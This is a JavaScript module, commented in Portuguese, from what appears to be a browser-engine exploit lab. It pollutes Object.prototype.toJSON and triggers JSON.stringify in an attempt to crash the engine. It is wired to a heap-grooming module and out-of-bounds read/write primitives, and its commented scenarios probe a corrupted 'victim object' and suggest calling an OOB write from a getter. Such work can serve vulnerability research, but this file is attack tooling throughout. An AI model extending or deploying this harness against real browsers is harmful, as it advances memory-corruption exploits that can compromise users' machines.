// js/json_exploit_test.mjs
import { log as appLog, PAUSE_LAB } from './utils.mjs'; // Usando o log global

// Importe Core e Groomer para interagir com seus objetos, se necessário para os experimentos
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs';
// Se AdvancedInt64 for necessário aqui, importe-o. Para este PoC, pode não ser diretamente.
// import { AdvancedInt64 } from './int64.mjs';

const FNAME_BASE = "JsonExploitTest";

// Contador para evitar recursão infinita em certos experimentos
let toJsonRecursionCounter = 0;
const MAX_TO_JSON_RECURSION = 5;

// A função agora aceita um 'objectToSerialize' para maior flexibilidade nos testes
export async function attemptJsonStringifyCrash(objectToSerialize) {
    appLog(`--- Iniciando ${FNAME_BASE}.attemptJsonStringifyCrash ---`, 'test', FNAME_BASE);
    toJsonRecursionCounter = 0; // Reseta o contador a cada chamada

    const ppKey = 'toJSON';
    let originalToJSON_Descriptor; // Para restaurar corretamente
    let ppAppliedSuccessfully = false;
    let crashObserved = false;

    // Usa o objeto passado como argumento, ou um objeto de teste padrão
    const currentTestObject = objectToSerialize || {
        data1: "default_test_data_alpha",
        data2: 12345,
        nested: {
            sub_data: true,
            another_val: "beta_default"
        }
    };
    appLog(`   Objeto a ser serializado (chaves): ${Object.keys(currentTestObject).join(', ')}`, 'info', FNAME_BASE);
    if (objectToSerialize && Groomer.victim_object && objectToSerialize.controlled_victim === Groomer.victim_object) {
        appLog(`   INFO: O objeto vítima parece estar incluído no objeto serializado.`, 'good', FNAME_BASE);
    }


    try {
        originalToJSON_Descriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        Object.prototype[ppKey] = function() {
            appLog(`===> Poluição Object.prototype.toJSON ATIVADA (Chamada ${++toJsonRecursionCounter}) <===`, 'vuln', FNAME_BASE);
            appLog(`   toJSON - typeof this: ${typeof this}`, 'info', FNAME_BASE);

            if (this !== null && typeof this === 'object') {
                appLog(`   toJSON - this.constructor.name: ${this.constructor ? this.constructor.name : 'N/A'}`, 'info', FNAME_BASE);
                try {
                    const keys = Object.keys(this);
                    appLog(`   toJSON - this keys (amostra): ${keys.slice(0,10).join(', ')} (total: ${keys.length})`, 'info', FNAME_BASE);
                } catch (e) {
                    appLog(`   ERRO ao inspecionar Object.keys(this) dentro do toJSON: ${e.message}`, 'error', FNAME_BASE);
                }
            } else if (this === null) {
                 appLog(`   toJSON - 'this' é null`, 'info', FNAME_BASE);
            } else {
                 appLog(`   toJSON - 'this' é do tipo primitivo: ${typeof this}, valor: ${String(this)}`, 'info', FNAME_BASE);
            }

            // ++++++++++++++++++++++++++++++++++++++++
            // +++++ PONTO DE EXPERIMENTAÇÃO ATIVA +++++
            // ++++++++++++++++++++++++++++++++++++++++
            // Descomente UM bloco de 'return' por vez para testar diferentes cenários.

            // --- Cenário 1: Tentar causar overflow/problemas com strings longas ou chaves longas ---
            /*
            try {
                const keyLength = 60; // Altere para testar
                const valueLength = 1024 * 20; // Altere para testar (20KB)
                let largeObject = {};
                const keyName = "K".repeat(keyLength);
                const keyValue = "V".repeat(valueLength);
                appLog(`   toJSON - Retornando objeto com chave de tamanho ${keyName.length} e valor de ${keyValue.length}`, 'info', FNAME_BASE);
                largeObject[keyName] = keyValue;
                return largeObject;
            } catch(e) {
                appLog(`   toJSON - Erro ao criar largeObject: ${e.message}`, 'error', FNAME_BASE);
                return {"error_creating_large_obj": true, "message": String(e.message)};
            }
            */

            // --- Cenário 2: Tentar retornar um número excessivo de chaves ---
            /*
            try {
                let manyKeysObject = {};
                const numberOfKeys = 5000; // Altere para testar
                appLog(`   toJSON - Retornando objeto com ${numberOfKeys} chaves.`, 'info', FNAME_BASE);
                for(let i=0; i < numberOfKeys; i++) {
                    manyKeysObject["key_" + i] = "val_" + i;
                }
                return manyKeysObject;
            } catch(e) {
                appLog(`   toJSON - Erro ao criar manyKeysObject: ${e.message}`, 'error', FNAME_BASE);
                return {"error_creating_many_keys_obj": true, "message": String(e.message)};
            }
            */

            // --- Cenário 3: Se 'this' for o victim_object (passado em currentTestObject) ---
            //              Este cenário é mais relevante se você passar Groomer.victim_object para JSON.stringify
            /*
            if (Groomer.victim_object && this === Groomer.victim_object) {
                appLog("   toJSON - 'this' É O OBJETO VÍTIMA! Potencialmente interessante!", "vuln", FNAME_BASE);
                // Tenta ler o comprimento (que pode ter sido corrompido por exploits anteriores)
                // e talvez um elemento (que pode ler OOB se o comprimento for corrompido).
                let victimData = {
                    isVictim: true,
                    length_seen_by_toJSON: 0,
                    element_0_seen_by_toJSON: null,
                    typeError: null
                };
                try {
                    victimData.length_seen_by_toJSON = this.length;
                    victimData.element_0_seen_by_toJSON = this[0]; // Cuidado: pode travar aqui se m_vector for ruim
                } catch (e) {
                    appLog(`   toJSON - Erro ao acessar propriedades da vítima: ${e.message}`, 'error', FNAME_BASE);
                    victimData.typeError = String(e.message);
                }
                return victimData;
            }
            */

            // --- Cenário 4: Tentar recursão controlada (cuidado com estouro de pilha) ---
            /*
            if (toJsonRecursionCounter < MAX_TO_JSON_RECURSION) {
                appLog(`   toJSON - Recursão controlada, contador: ${toJsonRecursionCounter}`, 'info', FNAME_BASE);
                return { "recursive_call": this }; // Chama toJSON no mesmo objeto 'this'
            } else {
                appLog(`   toJSON - Máximo de recursões atingido. Retornando valor simples.`, 'warn', FNAME_BASE);
                return { "max_recursion_reached": true, "final_this_type": String(typeof this) };
            }
            */

            // --- Cenário 5: Retornar um getter problemático ---
            /*
            return {
                get triggerExploitLogic() {
                    appLog("   toJSON - Getter 'triggerExploitLogic' ACESSADO!", "vuln", FNAME_BASE);
                    // AQUI VOCÊ PODERIA:
                    // 1. Tentar alocar/liberar memória de forma específica.
                    // 2. Chamar outras funções do seu exploit.
                    // 3. Tentar interagir com Core.oob_dataview_real ou Groomer.victim_object
                    //    se eles estiverem acessíveis e configurados.
                    //    Ex: Core.oob_write_relative(some_offset, some_value, 4);
                    // throw new Error("Erro controlado dentro do getter para testar manipulação de exceção");
                    return "valor_do_getter_executado";
                }
            };
            */

            // --- Fallback: Comportamento original do seu PoC (modificado para mais detalhes) ---
            let keysInfo = "N/A (this não é objeto ou erro)";
            let thisValueForLog = String(this);
            if (this !== null && typeof this === 'object') {
                try {
                    const keys = Object.keys(this);
                    keysInfo = `Contagem de chaves: ${keys.length}. Amostra: ${keys.slice(0,5).join(', ')}`;
                    // Para objetos muito grandes, evite logar o objeto inteiro
                    if (keys.length > 20) thisValueForLog = "[Objeto com muitas chaves]";
                } catch (e) {
                    keysInfo = `Erro ao obter chaves: ${e.message}`;
                    thisValueForLog = `[Erro ao obter chaves: ${e.message}]`;
                }
            }
            appLog(`   toJSON - Fallback: Retornando informações sobre 'this' (valor: ${thisValueForLog.substring(0,100)})`, 'info', FNAME_BASE);
            return {
                "toJSON_executed_fallback": true,
                "this_type_fallback": String(typeof this),
                "object_keys_info_fallback": keysInfo
            };
            // ++++++++++++++++++++++++++++++++++++++++
            // +++ FIM DO PONTO DE EXPERIMENTAÇÃO +++++
            // ++++++++++++++++++++++++++++++++++++++++
        };
        ppAppliedSuccessfully = true;
        appLog(`Poluição Object.prototype.${ppKey} aplicada com sucesso.`, 'good', FNAME_BASE);
        appLog(`Tentando JSON.stringify no objeto de teste... (Esta é a chamada que pode travar o navegador)`, 'critical', FNAME_BASE);

        // Forçar o navegador a renderizar o log antes da operação que pode crashar
        await PAUSE_LAB(150); // Aumentado ligeiramente para dar mais chance de flush do log

        // Usar currentTestObject que pode ser o padrão ou o fornecido
        const result = JSON.stringify(currentTestObject, null, 2); // Adicionado null, 2 para pretty-print, ajuda na análise

        // Se chegarmos aqui, não houve crash visível imediato
        appLog(`JSON.stringify CONCLUÍDO SEM CRASH VISÍVEL.`, 'warn', FNAME_BASE);
        if (result) {
            appLog(`   Resultado (primeiros 500 caracteres): ${String(result).substring(0, 500)}...`, 'info', FNAME_BASE);
            if (String(result).includes('"toJSON_executed_fallback":true') ||
                String(result).includes('isVictim":true') ||
                String(result).includes('valor_do_getter_executado') ) {
                appLog("   INFO: Poluição via Object.prototype.toJSON afetou JSON.stringify como esperado (detectado pelo conteúdo do resultado).", 'good', FNAME_BASE);
            }
        } else {
            appLog("   INFO: JSON.stringify retornou um resultado vazio ou nulo.", 'warn', FNAME_BASE);
        }

    } catch (e) {
        appLog(`CRASH/ERRO CAPTURADO durante JSON.stringify: ${e.name} - ${e.message}`, 'vuln', FNAME_BASE);
        // Logar o stack se disponível
        if (e.stack) {
            appLog(`   Stack do Erro: ${e.stack}`, 'error', FNAME_BASE);
        }
        console.error("JSON.stringify Crash Test Error:", e); // Manter o console.error para o debugger do navegador
        appLog("CRASH OBSERVADO! Verifique o console do debugger do motor JS se possível para mais detalhes (ex: call stack nativo, endereço do crash).", 'critical', FNAME_BASE);
        crashObserved = true;
    } finally {
        if (ppAppliedSuccessfully) {
            if (originalToJSON_Descriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor);
            } else {
                delete Object.prototype[ppKey]; // Se não existia antes
            }
            appLog(`Object.prototype.${ppKey} restaurado para o original (ou deletado).`, 'good', `${FNAME_BASE}.Cleanup`);
        }
    }

    appLog(`--- ${FNAME_BASE}.attemptJsonStringifyCrash Concluído (Crash Observado: ${crashObserved}) ---`, 'test', FNAME_BASE);
    if (crashObserved) {
        appLog("*********************************************************************", "vuln", FNAME_BASE);
        appLog("****** CRASH ACIONADO (OU ERRO CAPTURADO) VIA JSON.STRINGIFY! ******", "vuln", FNAME_BASE);
        appLog("****** Analise os logs e o debugger para entender a causa raiz. ******", "vuln", FNAME_BASE);
        appLog("*********************************************************************", "vuln", FNAME_BASE);
    } else {
        appLog("Nenhum crash capturável ocorreu durante o teste JSON.stringify. Verifique os logs para comportamento inesperado.", "warn", FNAME_BASE);
    }
    return crashObserved;
}

// Função auxiliar em app.mjs para chamar attemptJsonStringifyCrash com objetos específicos (exemplo)
/*
// Em app.mjs, dentro de setupUIEventListeners, você pode modificar o listener:
document.getElementById('btnTestJsonStringify')?.addEventListener('click', async () => {
    // Exemplo 1: Chamar com o objeto padrão
    // await JsonExploitTest.attemptJsonStringifyCrash();

    // Exemplo 2: Chamar com o objeto vítima (se preparado)
    if (Groomer.victim_object) {
        appLog("Preparando para testar JSON.stringify com o OBJETO VÍTIMA.", "tool", "App.JsonTestSetup");
        await JsonExploitTest.attemptJsonStringifyCrash({
            description: "Teste com objeto vítima",
            controlled_victim: Groomer.victim_object,
            other_data: "algum_valor_contextual",
            oob_buffer_ref: Core.oob_array_buffer_real // Cuidado ao passar referências diretas a ArrayBuffers grandes
        });
    } else {
        appLog("Objeto vítima não preparado, testando JSON.stringify com objeto padrão.", "warn", "App.JsonTestSetup");
        await JsonExploitTest.attemptJsonStringifyCrash();
    }
});
*/
